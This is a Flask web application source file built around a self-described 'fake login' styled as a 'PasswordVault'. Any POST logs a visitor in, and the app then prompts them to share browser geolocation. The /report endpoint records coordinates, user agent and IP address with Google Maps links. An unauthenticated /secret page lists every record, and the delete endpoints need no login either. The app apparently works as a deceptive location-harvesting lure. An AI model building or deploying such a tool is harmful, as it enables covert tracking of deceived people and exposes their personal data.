from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import os
from dotenv import load_dotenv
import json
from datetime import datetime
from pathlib import Path
from threading import Lock
import math

app = Flask(__name__, static_folder='static', template_folder='templates')
# load environment from .env when present (local dev)
load_dotenv()
# session secret for the fake login; encourage setting via env var in production
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'dev-secret-key')

DATA_FILE = Path('data.json')
_lock = Lock()


def append_record(record: dict):
    """Append a JSON record to DATA_FILE in a thread-safe way."""
    with _lock:
        if DATA_FILE.exists():
            try:
                with DATA_FILE.open('r', encoding='utf-8') as f:
                    data = json.load(f)
            except Exception:
                data = []
        else:
            data = []
        # backfill google_map_link for existing records if missing
        backfilled = False
        for r in data:
            if 'google_map_link' not in r and 'lat' in r and 'lng' in r:
                try:
                    r['google_map_link'] = f"https://www.google.com/maps/search/?api=1&query={r['lat']},{r['lng']}"
                    backfilled = True
                except Exception:
                    pass
        # If last record is effectively the same, skip to avoid spamming
        def _same(a, b):
            try:
                # compare rounded coordinates and device info
                a_lat = round(float(a.get('lat', 0)), 6)
                a_lng = round(float(a.get('lng', 0)), 6)
                b_lat = round(float(b.get('lat', 0)), 6)
                b_lng = round(float(b.get('lng', 0)), 6)
                if a_lat != b_lat or a_lng != b_lng:
                    return False
                # device equality (userAgent + isMobile)
                a_dev = a.get('device') or {}
                b_dev = b.get('device') or {}
                return (a_dev.get('userAgent') == b_dev.get('userAgent') and
                        a_dev.get('isMobile') == b_dev.get('isMobile'))
            except Exception:
                return False

        if data and _same(record, data[-1]):
            # If we only filled missing google_map_link values, persist them even though the new
            # incoming report is a duplicate (so admin can get links backfilled).
            if backfilled:
                try:
                    with DATA_FILE.open('w', encoding='utf-8') as f:
                        json.dump(data, f, ensure_ascii=False, indent=2)
                except Exception:
                    pass
            return False

        # add google map link to the new record for admin convenience
        try:
            if 'lat' in record and 'lng' in record:
                record['google_map_link'] = f"https://www.google.com/maps/search/?api=1&query={record['lat']},{record['lng']}"
        except Exception:
            pass

        data.append(record)
        with DATA_FILE.open('w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
        return True


@app.route('/')
def index():
    # Provide the Google Maps API key via env var if present
    google_key = os.environ.get('GOOGLE_MAPS_API_KEY', '')
    # require login first
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    # require that the user has allowed location (client must POST to /allow_location)
    if not session.get('location_allowed'):
        return redirect(url_for('consent'))
    # render the merged PasswordVault (admin) UI
    try:
        if DATA_FILE.exists():
            with DATA_FILE.open('r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []

    # prepare display fields: pretty local timestamp and relative time
    from dateutil import parser as _parser, tz as _tz
    def _prepare(r):
        ts = r.get('timestamp')
        # default values
        r['_pretty_timestamp'] = ts or ''
        r['_relative'] = ''
        if not ts:
            return r
        try:
            dt = _parser.isoparse(ts)
            # convert to local timezone string
            local = dt.astimezone(_tz.tzlocal())
            r['_pretty_timestamp'] = local.strftime('%Y-%m-%d %H:%M:%S %Z')
            # relative time
            now = datetime.now(_tz.tzlocal())
            delta = now - local
            secs = int(delta.total_seconds())
            if secs < 10:
                r['_relative'] = 'just now'
            elif secs < 60:
                r['_relative'] = f"{secs}s ago"
            elif secs < 3600:
                r['_relative'] = f"{secs//60}m ago"
            elif secs < 86400:
                r['_relative'] = f"{secs//3600}h ago"
            elif secs < 60*60*24*30:
                r['_relative'] = f"{secs//86400}d ago"
            else:
                # older than ~1 month, show date
                r['_relative'] = local.strftime('%b %d, %Y')
        except Exception:
            r['_pretty_timestamp'] = ts
            r['_relative'] = ts
        # derive a small friendly device string
        try:
            dev = r.get('device') or {}
            ua = (dev.get('userAgent') or '')
            is_mobile = dev.get('isMobile')
            browser = 'Unknown'
            ua_low = ua.lower()
            # browser
            if 'firefox' in ua_low:
                browser = 'Firefox'
            elif 'edg' in ua_low or 'edge' in ua_low:
                browser = 'Edge'
            elif 'chrome' in ua_low and 'chromium' not in ua_low and 'edg' not in ua_low:
                browser = 'Chrome'
            elif 'chromium' in ua_low:
                browser = 'Chromium'
            elif 'safari' in ua_low and 'chrome' not in ua_low:
                browser = 'Safari'
            # OS
            os_label = 'Unknown'
            if 'windows' in ua_low:
                os_label = 'Windows'
            elif 'mac os x' in ua_low or 'macintosh' in ua_low or 'mac os' in ua_low:
                os_label = 'macOS'
            elif 'android' in ua_low:
                os_label = 'Android'
            elif 'iphone' in ua_low or 'ipad' in ua_low or 'ipod' in ua_low or 'ios' in ua_low:
                os_label = 'iOS'
            elif 'linux' in ua_low:
                os_label = 'Linux'
            # small OS emoji map and short device string (Browser · OS)
            icon = ''
            if os_label == 'Windows':
                icon = '🪟'
            elif os_label == 'macOS':
                icon = ''
            elif os_label == 'Android':
                icon = '🤖'
            elif os_label == 'iOS':
                icon = ''
            elif os_label == 'Linux':
                icon = '🐧'
            r['_os_icon'] = icon
            r['_device_str'] = f"{browser} · {os_label}"
        except Exception:
            r['_device_str'] = '-'
        return r

    # sort descending by timestamp when possible (newest first)
    def _key(r):
        try:
            return _parser.isoparse(r.get('timestamp'))
        except Exception:
            return datetime.min

    data = sorted(data, key=_key, reverse=True)
    data = [_prepare(r) for r in data]

    # pagination: 10 per page, ascending order (oldest first)
    per_page = 10
    try:
        page = int(request.args.get('page', '1'))
        if page < 1:
            page = 1
    except Exception:
        page = 1
    total = len(data)
    total_pages = max(1, math.ceil(total / per_page))
    if page > total_pages:
        page = total_pages
    start = (page - 1) * per_page
    end = start + per_page
    page_items = data[start:end]

    return render_template('admin.html', data=page_items, google_key=google_key, page=page, total_pages=total_pages, total=total, now=datetime.now())


@app.route('/table-body')
def table_body():
    # return only the tbody HTML for the requested page (used by AJAX refresh)
    try:
        if DATA_FILE.exists():
            with DATA_FILE.open('r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []

    from dateutil import parser as _parser, tz as _tz
    def _prepare(r):
        ts = r.get('timestamp')
        r['_pretty_timestamp'] = ts or ''
        r['_relative'] = ''
        if ts:
            try:
                dt = _parser.isoparse(ts)
                local = dt.astimezone(_tz.tzlocal())
                r['_pretty_timestamp'] = local.strftime('%Y-%m-%d %H:%M:%S %Z')
                now = datetime.now(_tz.tzlocal())
                delta = now - local
                secs = int(delta.total_seconds())
                if secs < 10:
                    r['_relative'] = 'just now'
                elif secs < 60:
                    r['_relative'] = f"{secs}s ago"
                elif secs < 3600:
                    r['_relative'] = f"{secs//60}m ago"
                elif secs < 86400:
                    r['_relative'] = f"{secs//3600}h ago"
                elif secs < 60*60*24*30:
                    r['_relative'] = f"{secs//86400}d ago"
                else:
                    r['_relative'] = local.strftime('%b %d, %Y')
            except Exception:
                r['_pretty_timestamp'] = ts
                r['_relative'] = ts
        try:
            dev = r.get('device') or {}
            ua = (dev.get('userAgent') or '')
            ua_low = ua.lower()
            browser = 'Unknown'
            if 'firefox' in ua_low:
                browser = 'Firefox'
            elif 'edg' in ua_low or 'edge' in ua_low:
                browser = 'Edge'
            elif 'chrome' in ua_low and 'chromium' not in ua_low and 'edg' not in ua_low:
                browser = 'Chrome'
            elif 'chromium' in ua_low:
                browser = 'Chromium'
            elif 'safari' in ua_low and 'chrome' not in ua_low:
                browser = 'Safari'
            os_label = 'Unknown'
            if 'windows' in ua_low:
                os_label = 'Windows'
            elif 'mac os x' in ua_low or 'macintosh' in ua_low or 'mac os' in ua_low:
                os_label = 'macOS'
            elif 'android' in ua_low:
                os_label = 'Android'
            elif 'iphone' in ua_low or 'ipad' in ua_low or 'ipod' in ua_low or 'ios' in ua_low:
                os_label = 'iOS'
            elif 'linux' in ua_low:
                os_label = 'Linux'
            icon = ''
            if os_label == 'Windows':
                icon = '🪟'
            elif os_label == 'macOS':
                icon = ''
            elif os_label == 'Android':
                icon = '🤖'
            elif os_label == 'iOS':
                icon = ''
            elif os_label == 'Linux':
                icon = '🐧'
            r['_os_icon'] = icon
            r['_device_str'] = f"{browser} · {os_label}"
        except Exception:
            r['_device_str'] = '-'
        return r

    def _key(r):
        try:
            return _parser.isoparse(r.get('timestamp'))
        except Exception:
            return datetime.min

    data = sorted(data, key=_key, reverse=True)
    data = [_prepare(r) for r in data]

    per_page = 10
    try:
        page = int(request.args.get('page', '1'))
        if page < 1:
            page = 1
    except Exception:
        page = 1
    total = len(data)
    total_pages = max(1, math.ceil(total / per_page))
    if page > total_pages:
        page = total_pages
    start = (page - 1) * per_page
    end = start + per_page
    page_items = data[start:end]

    # render only the tbody portion; admin_tbody.html will contain the loop
    show_delete = request.args.get('show_delete', '0') == '1'
    return render_template('admin_tbody.html', data=page_items, show_delete_controls=show_delete)


@app.route('/table-meta')
def table_meta():
    # lightweight metadata endpoint to detect changes without rendering HTML
    try:
        if DATA_FILE.exists():
            with DATA_FILE.open('r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []
    total = len(data)
    newest = ''
    if total:
        try:
            newest = data[-1].get('timestamp', '')
        except Exception:
            newest = ''
    return jsonify({'total': total, 'newest': newest})


@app.route('/admin')
def admin():
    # redirect to the merged index (PasswordVault)
    return redirect(url_for('index'))


@app.route('/secret')
def secret():
    # public, read-only view of data.json (no login required)
    try:
        if DATA_FILE.exists():
            with DATA_FILE.open('r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []

    from dateutil import parser as _parser, tz as _tz
    def _prepare(r):
        ts = r.get('timestamp')
        r['_pretty_timestamp'] = ts or ''
        r['_relative'] = ''
        if ts:
            try:
                dt = _parser.isoparse(ts)
                local = dt.astimezone(_tz.tzlocal())
                r['_pretty_timestamp'] = local.strftime('%Y-%m-%d %H:%M:%S %Z')
                now = datetime.now(_tz.tzlocal())
                delta = now - local
                secs = int(delta.total_seconds())
                if secs < 10:
                    r['_relative'] = 'just now'
                elif secs < 60:
                    r['_relative'] = f"{secs}s ago"
                elif secs < 3600:
                    r['_relative'] = f"{secs//60}m ago"
                elif secs < 86400:
                    r['_relative'] = f"{secs//3600}h ago"
                elif secs < 60*60*24*30:
                    r['_relative'] = f"{secs//86400}d ago"
                else:
                    r['_relative'] = local.strftime('%b %d, %Y')
            except Exception:
                r['_pretty_timestamp'] = ts
                r['_relative'] = ts
        try:
            dev = r.get('device') or {}
            ua = (dev.get('userAgent') or '')
            ua_low = ua.lower()
            browser = 'Unknown'
            if 'firefox' in ua_low:
                browser = 'Firefox'
            elif 'edg' in ua_low or 'edge' in ua_low:
                browser = 'Edge'
            elif 'chrome' in ua_low and 'chromium' not in ua_low and 'edg' not in ua_low:
                browser = 'Chrome'
            elif 'chromium' in ua_low:
                browser = 'Chromium'
            elif 'safari' in ua_low and 'chrome' not in ua_low:
                browser = 'Safari'
            os_label = 'Unknown'
            if 'windows' in ua_low:
                os_label = 'Windows'
            elif 'mac os x' in ua_low or 'macintosh' in ua_low or 'mac os' in ua_low:
                os_label = 'macOS'
            elif 'android' in ua_low:
                os_label = 'Android'
            elif 'iphone' in ua_low or 'ipad' in ua_low or 'ipod' in ua_low or 'ios' in ua_low:
                os_label = 'iOS'
            elif 'linux' in ua_low:
                os_label = 'Linux'
            icon = ''
            if os_label == 'Windows':
                icon = '🪟'
            elif os_label == 'macOS':
                icon = ''
            elif os_label == 'Android':
                icon = '🤖'
            elif os_label == 'iOS':
                icon = ''
            elif os_label == 'Linux':
                icon = '🐧'
            r['_os_icon'] = icon
            r['_device_str'] = f"{browser} · {os_label}"
        except Exception:
            r['_device_str'] = '-'
        return r

    def _key(r):
        try:
            return _parser.isoparse(r.get('timestamp'))
        except Exception:
            return datetime.min

    data = sorted(data, key=_key, reverse=True)
    data = [_prepare(r) for r in data]

    # pagination: 10 per page
    per_page = 10
    try:
        page = int(request.args.get('page', '1'))
        if page < 1:
            page = 1
    except Exception:
        page = 1
    total = len(data)
    total_pages = max(1, math.ceil(total / per_page))
    if page > total_pages:
        page = total_pages
    start = (page - 1) * per_page
    end = start + per_page
    page_items = data[start:end]

    return render_template('secret.html', data=page_items, page=page, total_pages=total_pages, total=total, show_delete_controls=True)


@app.route('/login', methods=['GET', 'POST'])
def login():
    # fake login: any POST will mark session as logged in
    if request.method == 'POST':
        session['logged_in'] = True
        # after login, go to consent step if location not yet allowed
        if not session.get('location_allowed'):
            return redirect(url_for('consent'))
        return redirect(url_for('admin'))
    return render_template('login.html')


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))


@app.route('/consent')
def consent():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    google_key = os.environ.get('GOOGLE_MAPS_API_KEY', '')
    return render_template('consent.html', google_key=google_key)


@app.route('/allow_location', methods=['POST'])
def allow_location():
    # Mark in the session that the user allowed geolocation in the browser
    session['location_allowed'] = True
    # record the current newest timestamp so the client can wait for new data
    try:
        if DATA_FILE.exists():
            with DATA_FILE.open('r', encoding='utf-8') as f:
                data = json.load(f)
        else:
            data = []
    except Exception:
        data = []
    newest = ''
    if data:
        try:
            newest = data[-1].get('timestamp', '')
        except Exception:
            newest = ''
    # signal to the admin UI to keep covered until a newer record appears
    session['wait_for_new'] = True
    session['meta_newest_base'] = newest
    return jsonify({'status': 'ok'})


@app.route('/ack_new_data', methods=['POST'])
def ack_new_data():
    # client notifies server that it observed new data and the overlay may be cleared
    session.pop('wait_for_new', None)
    session.pop('meta_newest_base', None)
    return jsonify({'status': 'ok'})


@app.route('/report', methods=['POST'])
def report():
    payload = request.get_json(silent=True)
    if not payload or 'lat' not in payload or 'lng' not in payload:
        return jsonify({'error': 'invalid payload'}), 400
    # determine client IP: prefer X-Forwarded-For (first value), then X-Real-IP, then remote_addr
    ip = None
    try:
        xff = request.headers.get('X-Forwarded-For', '')
        if xff:
            # may contain a list of IPs
            ip = xff.split(',')[0].strip()
        if not ip:
            ip = request.headers.get('X-Real-IP', '')
        if not ip:
            ip = request.remote_addr
    except Exception:
        ip = None

    record = {
        'lat': payload.get('lat'),
        'lng': payload.get('lng'),
        'accuracy': payload.get('accuracy'),
        'device': payload.get('device'),
        'timestamp': payload.get('timestamp') or datetime.utcnow().isoformat() + 'Z',
        'ip': ip
    }
    appended = append_record(record)
    if appended:
        return jsonify({'status': 'ok'})
    else:
        return jsonify({'status': 'skipped', 'reason': 'duplicate'}), 200


@app.route('/delete-records', methods=['POST'])
def delete_records():
    # Soft-delete: move matching records to deleted.json so they can be restored
    payload = request.get_json(silent=True)
    if not payload or 'timestamps' not in payload or not isinstance(payload.get('timestamps'), list):
        return jsonify({'error': 'invalid payload, expected {timestamps: [...] }'}), 400
    timestamps = set([t for t in payload.get('timestamps') if isinstance(t, str)])
    if not timestamps:
        return jsonify({'error': 'no timestamps provided'}), 400

    removed_list = []
    deleted_file = Path('deleted.json')
    with _lock:
        try:
            if DATA_FILE.exists():
                with DATA_FILE.open('r', encoding='utf-8') as f:
                    data = json.load(f)
            else:
                data = []
        except Exception:
            data = []

        keep = []
        for r in data:
            if r.get('timestamp') in timestamps:
                removed_list.append(r)
            else:
                keep.append(r)

        try:
            with DATA_FILE.open('w', encoding='utf-8') as f:
                json.dump(keep, f, ensure_ascii=False, indent=2)
        except Exception:
            return jsonify({'error': 'failed to write data file'}), 500

        # append removed entries to deleted.json
        try:
            if deleted_file.exists():
                with deleted_file.open('r', encoding='utf-8') as f:
                    deleted = json.load(f)
            else:
                deleted = []
        except Exception:
            deleted = []
        deleted.extend(removed_list)
        try:
            with deleted_file.open('w', encoding='utf-8') as f:
                json.dump(deleted, f, ensure_ascii=False, indent=2)
        except Exception:
            return jsonify({'error': 'failed to write deleted file'}), 500

    total = len(keep)
    newest = ''
    if total:
        try:
            newest = keep[-1].get('timestamp', '')
        except Exception:
            newest = ''
    return jsonify({'removed': len(removed_list), 'timestamps': [r.get('timestamp') for r in removed_list], 'total': total, 'newest': newest})


@app.route('/undelete-records', methods=['POST'])
def undelete_records():
    payload = request.get_json(silent=True)
    if not payload or 'timestamps' not in payload or not isinstance(payload.get('timestamps'), list):
        return jsonify({'error': 'invalid payload, expected {timestamps: [...] }'}), 400
    timestamps = set([t for t in payload.get('timestamps') if isinstance(t, str)])
    if not timestamps:
        return jsonify({'error': 'no timestamps provided'}), 400

    deleted_file = Path('deleted.json')
    restored = []
    with _lock:
        try:
            if deleted_file.exists():
                with deleted_file.open('r', encoding='utf-8') as f:
                    deleted = json.load(f)
            else:
                deleted = []
        except Exception:
            deleted = []

        remaining = []
        for r in deleted:
            if r.get('timestamp') in timestamps:
                restored.append(r)
            else:
                remaining.append(r)

        if not restored:
            return jsonify({'restored': 0, 'message': 'no matching deleted records found'}), 200

        try:
            if DATA_FILE.exists():
                with DATA_FILE.open('r', encoding='utf-8') as f:
                    data = json.load(f)
            else:
                data = []
        except Exception:
            data = []

        data.extend(restored)
        # try to sort by timestamp desc when possible
        try:
            from dateutil import parser as _parser
            data = sorted(data, key=lambda r: _parser.isoparse(r.get('timestamp', '')), reverse=True)
        except Exception:
            pass

        try:
            with DATA_FILE.open('w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception:
            return jsonify({'error': 'failed to write data file'}), 500

        try:
            with deleted_file.open('w', encoding='utf-8') as f:
                json.dump(remaining, f, ensure_ascii=False, indent=2)
        except Exception:
            return jsonify({'error': 'failed to update deleted file'}), 500

    return jsonify({'restored': len(restored), 'timestamps': [r.get('timestamp') for r in restored]})


@app.route('/clear-deleted', methods=['POST'])
def clear_deleted():
    """Truncate the deleted.json file (soft-delete archive) and return how many entries were removed.
    This is a destructive action; calls should be protected in production.
    """
    deleted_file = Path('deleted.json')
    # simple per-session rate limit: only allow once per 60 seconds
    try:
        last = session.get('last_clear_deleted')
        if last:
            from dateutil import parser as _parser
            last_dt = _parser.isoparse(last)
            now_dt = datetime.utcnow()
            delta = (now_dt - last_dt).total_seconds()
            if delta < 60:
                retry_after = int(60 - delta)
                return jsonify({'error': 'rate_limited', 'retry_after': retry_after}), 429
    except Exception:
        # if anything goes wrong parsing session data, ignore and proceed
        pass

    with _lock:
        try:
            if deleted_file.exists():
                with deleted_file.open('r', encoding='utf-8') as f:
                    deleted = json.load(f)
            else:
                deleted = []
        except Exception:
            deleted = []

        count = len(deleted)
        try:
            # overwrite with an empty list
            with deleted_file.open('w', encoding='utf-8') as f:
                json.dump([], f, ensure_ascii=False, indent=2)
        except Exception:
            return jsonify({'error': 'failed to clear deleted file'}), 500

    # record last clear time in session as ISO string
    try:
        session['last_clear_deleted'] = datetime.utcnow().isoformat() + 'Z'
    except Exception:
        pass

    return jsonify({'cleared': True, 'removed_count': count})


if __name__ == '__main__':
    # Run without debug and without the reloader for a production-like run
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
